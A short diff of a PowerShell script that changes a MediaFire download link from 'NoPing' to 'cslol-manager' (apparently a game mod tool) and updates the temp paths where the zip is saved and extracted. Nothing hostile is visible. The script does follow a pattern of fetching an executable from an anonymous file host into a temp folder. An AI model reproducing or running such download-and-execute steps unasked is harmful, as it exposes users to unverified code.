@@ -1,8 +1,8 @@
-$zipUrl = "https://download1474.mediafire.com/9bupya8z2afgbT9E0Kp4k1aGOdhkoABxzDtRsHR0lCuJeegMax34R9AR6USpDKRl--Tm39s6fDUxpVn-MVfYSdyV8_7NJXXE8aba8apLttBQ9G2L7SxJQILsGwVDcx0vwG_Ehshd0H8Rhj1VR24skgINupHjRwkomRSNaSwgqpOsOg/27v903l90sper9s/NoPing.zip"
-$exeName = "NoPing.exe"
+$zipUrl = "https://download1339.mediafire.com/9v13x3ppljjgHFu8L5S3UivV7kDfgUdynLCcU4-UZGbfQOfW4D1u-Gf82NCxlVGw1-wie46KhzwzzkmFqFD9Ee0uJosfGJb6AG1baRilGJ8FeCw8Tv34KZa459CC5CQJ7tc-n-D5kEalt3lHGbIW8PiiWfK1N1l5PkQ8lnSWhxzYkw/ymkoxyal6qydp9k/CSLOL.zip"
+$exeName = "cslol-manager.exe"
 $tempFolder = [System.IO.Path]::GetTempPath()
-$zipFile = Join-Path $tempFolder "NoPing.zip"
-$extractFolder = Join-Path $tempFolder "NoPing"
+$zipFile = Join-Path $tempFolder "cslol.zip"
+$extractFolder = Join-Path $tempFolder "cslol"
 $exePath = Join-Path $extractFolder $exeName
 
 # Download using curl if the file doesn't exist
